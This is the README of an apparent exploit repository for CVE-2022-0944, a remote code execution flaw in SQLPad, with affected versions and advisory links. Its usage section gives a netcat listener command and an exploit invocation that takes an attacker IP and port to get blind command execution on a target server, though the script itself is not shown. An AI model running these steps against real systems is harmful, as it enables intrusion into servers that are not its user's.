# SQLPad RCE Exploit

This repository contains an exploit script for CVE-2022-0944 in SQLPad, a vulnerability that allows for Remote Code Execution (RCE) via the `/api/test-connection` endpoint.

## Overview

The provided script (`exploit.py`) demonstrates how to exploit the RCE vulnerability in SQLPad. The script sends a payload to the vulnerable endpoint, executing a command on the target server.

## Features

- **Blind RCE**: Executes commands on the target server without receiving direct responses.
- **Netcat Listener**: Requires a netcat listener setup on the attacker's machine to receive outputs.

## Prerequisites

- Python 3.x
- `requests` library (can be installed via `pip`)

## Usage
1. Setup a Netcat Listener

```bash
nc -lvnp 4444
```
Run the Exploit

```bash
python exploit.py <sqlpad_url> <attacker_ip> <attacker_port>
```

### Affected Versions

- Up to (excluding) 6.10.1

### References

- [Huntr - CVE-2022-0944](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)
- [NVD - CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)




